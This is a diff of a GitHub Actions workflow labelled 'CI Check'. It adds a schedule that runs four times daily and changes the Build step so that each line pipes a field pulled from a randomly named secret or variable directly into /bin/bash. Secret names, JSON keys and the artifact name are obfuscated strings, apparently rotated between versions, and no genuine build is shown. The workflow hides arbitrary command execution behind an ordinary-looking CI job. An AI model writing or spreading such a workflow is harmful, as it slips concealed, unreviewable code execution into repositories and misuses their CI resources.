@@ -2,6 +2,8 @@ name: CI Check
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '44 3,9,15,21 * * *'
 env:
   CI: true
 concurrency:
@@ -17,15 +19,14 @@ jobs:
           fetch-depth: 1
       - name: Build
         env:
-          bdks4: ${{ secrets.bdks4 }}
+          kxh7854: ${{ secrets.kxh7854 }}
         run: |
-          printf '%s' "$bdks4" | jq -r .evoi39496 | /bin/bash
-          echo $skv6 | jq -r .dvt87 | /bin/bash
-          echo $r1 | jq -r .azivh7 | /bin/bash
+          printf '%s' "$kxh7854" | jq -r .venae87107 | /bin/bash
+          echo $odoz63 | jq -r .ghuf95 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
         with:
-          name: GH31TfUe
+          name: VvK0MGG9
           path: "*.zip"
           retention-days: 1
